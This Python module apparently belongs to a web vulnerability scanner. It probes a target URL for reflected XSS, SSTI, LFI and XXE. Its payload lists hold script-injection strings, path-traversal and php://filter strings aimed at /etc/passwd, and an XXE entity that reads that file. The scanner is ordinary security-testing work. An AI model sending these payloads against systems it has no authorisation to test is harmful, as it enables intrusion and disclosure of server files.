"""
Reflected XSS, SSTI, LFI, XXE, and command injection testing.
"""
import json
import logging
import re
from urllib.parse import urljoin

from config.constants import LLM_MAX_GENERATED_PAYLOADS, RATE_LIMIT_DELAY_MS, SSL_TIMEOUT

from ._helpers import detect_framework, make_finding, safe_request

logger = logging.getLogger(__name__)

_DEFAULT_TIMEOUT = SSL_TIMEOUT
_DEFAULT_RATE_LIMIT = RATE_LIMIT_DELAY_MS / 1000.0

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    'javascript:alert(1)',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
    "'\"><img src=x onerror=alert(1)>",
    '<body onload=alert(1)>',
]

SSTI_PAYLOADS = [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '*{7*7}',
]

LFI_PAYLOADS = [
    '../../../../etc/passwd',
    '....//....//etc/passwd',
    '%2e%2e%2fetc%2fpasswd',
    '..%252fetc%252fpasswd',
    'php://filter/convert.base64-encode/resource=/etc/passwd',
]

XXE_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

IGNORE_PARAMS = [
    'redirect', 'next', 'url', 'dest', 'target', 'goto',
    'continue', 'return', 'ref', 'dest_url',
]


def run_check(target_url: str, session, findings: list) -> list[dict]:
    _check_xss(target_url, session, findings)
    _check_ssti(target_url, session, findings)
    _check_lfi(target_url, session, findings)
    _check_xxe(target_url, session, findings)
    return findings


def _check_xss(target_url, session, findings):
    resp = safe_request("GET", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
    if not resp:
        return
    params = re.findall(r'[?&](\w+)=', resp.text)
    if not params:
        return
    for param in set(params[:5]):
        if param.lower() in IGNORE_PARAMS:
            continue
        for payload in XSS_PAYLOADS[:5]:
            test_url = f"{target_url}?{param}={payload}"
            test_resp = safe_request("GET", test_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
            if not test_resp:
                continue
            if payload in test_resp.text:
                is_script_context = "<script>" in test_resp.text.lower() or "<script " in test_resp.text.lower()
                if is_script_context:
                    confidence = 0.85
                    severity = "HIGH"
                elif payload.startswith("<img") or payload.startswith("<svg"):
                    confidence = 0.7
                    severity = "MEDIUM"
                else:
                    confidence = 0.5
                    severity = "LOW"
                findings.append(make_finding("REFLECTED_XSS", severity, test_url, {
                    "parameter": param,
                    "payload": payload,
                    "reflected": True,
                    "verified": is_script_context,
                }, confidence))
                break


def _check_ssti(target_url, session, findings):
    resp = safe_request("GET", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
    if not resp:
        return
    params = re.findall(r'[?&](\w+)=', resp.text)
    if not params:
        return
    for param in set(params[:3]):
        for payload in SSTI_PAYLOADS:
            test_url = f"{target_url}?{param}={payload}"
            test_resp = safe_request("GET", test_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
            if not test_resp:
                continue
            has_evaluation = " 49 " in test_resp.text or ">49<" in test_resp.text
            if has_evaluation and "error" not in test_resp.text.lower() and "undefined" not in test_resp.text.lower():
                findings.append(make_finding("SSTI", "CRITICAL", test_url, {
                    "parameter": param,
                    "payload": payload,
                    "result": "49 (7*7 evaluated)",
                    "verified": True,
                }, 0.9))
                break


def _check_lfi(target_url, session, findings):
    resp = safe_request("GET", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
    if not resp:
        return
    params = re.findall(r'[?&](\w+)=', resp.text)
    if not params:
        return
    for param in set(params[:3]):
        for payload in LFI_PAYLOADS:
            test_url = f"{target_url}?{param}={payload}"
            test_resp = safe_request("GET", test_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT)
            if not test_resp:
                continue
            if "root:x:" in test_resp.text:
                findings.append(make_finding("LFI", "CRITICAL", test_url, {
                    "parameter": param,
                    "payload": payload,
                    "file_read": "/etc/passwd",
                }, 0.8))
                return


def _check_xxe(target_url, session, findings):
    resp = safe_request("POST", target_url, session, _DEFAULT_TIMEOUT, _DEFAULT_RATE_LIMIT,
                        data=XXE_PAYLOAD, headers={"Content-Type": "application/xml"})
    if resp and "root:x:" in resp.text:
        findings.append(make_finding("XXE", "CRITICAL", target_url, {
            "payload": "XXE file:///etc/passwd",
            "file_read": "/etc/passwd",
        }, 0.8))


class InjectionCheck:
    def __init__(self):
        self.name = "injection"

    def check(self, target_url: str, session, findings: list) -> list[dict]:
        return run_check(target_url, session, findings)
